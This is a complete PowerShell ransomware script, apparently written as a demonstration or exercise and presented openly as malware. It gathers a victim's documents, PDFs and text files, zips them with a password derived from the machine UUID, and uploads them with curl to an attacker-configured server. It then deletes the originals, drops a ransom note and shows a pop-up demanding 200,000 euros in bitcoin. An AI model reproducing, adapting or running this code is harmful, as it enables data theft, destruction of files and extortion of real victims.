$IP_WEB_SERVER = 'YOUR_WEB_SERVER_IP'
$upload_file_name = 'YOUR_UPLOAD_FILE'

function getUUID
{
    $raw = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID;
    $UUID = $raw.split('-')[4];
    return $UUID;
}


function makePass
{
    param (
        $path
    )

    $pass = New-Item $path"\pass.txt"
    $Rand = Get-Random
    $content = getUUID
    $final = $content + $rand
    Set-Content $pass $final
}



function list_files
{
    param (
        $path
    )
    
  	#Then We collect all document name with extension we want (txt, pdf...)
    $file = Get-ChildItem -Path $path\* -Recurse -ErrorAction SilentlyContinue -Include  @("*.xls*", "*.doc*", "*.pdf*", "*.ppt", "*.txt*")  
    

    return $file;
}

function zipAllFile

{
     param (
        $path
    )
    # Call list file to recolt all file then we select their full name (with extension)
    $files = list_files $path | Select-Object FullName | ForEach-Object {$_.FullName}

    #Choose to encrypt in zip file with password, recolt only basename (without extension)
    $zipFileName = list_files $path | Select-Object Basename | ForEach-Object {$_.Basename}
    #take only directory name in the path
    $pathfiles = list_files $path | Select-Object DirectoryName | ForEach-Object {$_.DirectoryName}
    #password for zip 
    $mypassword = getUUID
    #for loop, we take all fill than we use the 7zip excecutabe with password
    For($i=0;$i -lt $files.Count;$i++)
    {
        
        $ZipOutputFilePath = $pathfiles[$i] + "\" + $zipFileName[$i]
        $archive= $files[$i]
        $Path7Zip = "C:\Program Files\7-Zip\7z.exe"
        $arguments = "a -tzip ""$ZipOutputFilePath"" ""$archive"" -mx9 -p$mypassword"
        $windowStyle = "Normal"
        $p = Start-Process $Path7Zip -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle
    }

}

#Get new zip file list
function list_file_encrypted
{
    param (
        $path
    )
    $documents = [Environment]::GetFolderPath("MyDocuments")
    $file = Get-ChildItem -Path $path\* -Recurse -ErrorAction SilentlyContinue -Include @("*.zip*")  
    return $file;
}

#uploading to website
function upload {
    param (
        $path
    ) 
    $files = list_file_encrypted $path | Select-Object FullName | ForEach-Object {$_.FullName}
    For($i=0;$i -lt $files.Count;$i++) 
    {      
       $file_upload = "filename=@" + $files[$i]
       cmd /c curl -F $file_upload http://$IP_WEB_SERVER/$upload_file_name
    }
    
}

#delete all file, there is only zip file
function delete_file
{
    param (
        $path
    )
    
    $files = list_files $path | Select-Object FullName | ForEach-Object {$_.FullName}
    For($i=0;$i -lt $files.Count;$i++)
    {
       Remove-Item $files[$i]
    }


}


#Message
function message
{
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.Application]::EnableVisualStyles()
    $Form = New-Object System.Windows.Forms.Form
    $Form.ClientSize = "500,500"
    $Form.Text = "Ouille ouille ouille"
    
    $Label = New-Object System.Windows.Forms.Label

    $Label.Text = "Hi, you have been hacked,All your files have been encrypted and exfiltred. To retrieve your files you will need to pay 200 000 euros via bitcoin. You have 48 Hours to contact us : badguy@whereisbrian.com"

    $Label.Width = 300
    $Label.Height = 300

    $Label.Location = New-Object System.Drawing.Point(100,100)

    $Form.controls.AddRange(@($Label))
    $Form.ShowDialog()


}

#Readme for victim
function create_readme
{
    param (
        $path
    )

    $readme = New-Item $path"\readme.txt"
    Set-Content $readme 'Hi, you have been hacked, All your files have been encrypted and exfiltred. To retrieve your files you will need to pay 200 000 euros via bitcoin. You have 48 Hours to contact us : badguy@whereisbrian.com'
}



makePass $args[0]
zipAllFile $args[0]
upload $args[0]
delete_file $args[0]
create_readme $args[0]
message


